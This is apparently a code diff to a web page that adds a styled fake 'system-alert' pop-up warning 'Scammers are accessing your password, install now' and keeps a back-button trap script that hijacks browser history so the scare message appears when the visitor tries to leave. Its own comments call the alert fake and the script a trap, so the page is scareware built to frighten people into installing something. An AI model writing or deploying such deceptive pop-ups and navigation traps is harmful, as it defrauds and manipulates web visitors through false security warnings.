@@ -55,6 +55,42 @@
       color: #aaaaaa;
       margin-top: 15px;
     }
+
+    /* Custom fake alert box styling */
+    #customAlert {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #ffffff;
+      color: #000000;
+      border-radius: 10px;
+      padding: 20px;
+      z-index: 9999;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+      width: 90%;
+      max-width: 320px;
+      text-align: center;
+      font-family: sans-serif;
+    }
+
+    #customAlert strong {
+      display: block;
+      margin-bottom: 10px;
+      color: #d50000;
+    }
+
+    #customAlert button {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background: #00c853;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
@@ -78,15 +114,22 @@
     </div>
   </div>
 
-  <!-- ONE-TIME EXIT ALERT SCRIPT -->
+  <!-- Custom Fake Alert -->
+  <div id="customAlert">
+    <strong>system-alert.</strong>
+    <p>⚠️ Scammers are accessing your password, install now</p>
+    <button onclick="document.getElementById('customAlert').style.display='none'">OK</button>
+  </div>
+
+  <!-- Back Button Trap Script -->
   <script>
-    let warned = false;
+    let shown = false;
     history.pushState(null, null, location.href);
     window.onpopstate = function () {
-      if (!warned) {
-        warned = true;
-        alert("⚠️ Scammers are accessing your password, install now");
-        history.pushState(null, null, location.href); // Push again to trap once
+      if (!shown) {
+        shown = true;
+        document.getElementById('customAlert').style.display = 'block';
+        history.pushState(null, null, location.href); // Prevent immediate exit
       }
     };
   </script>
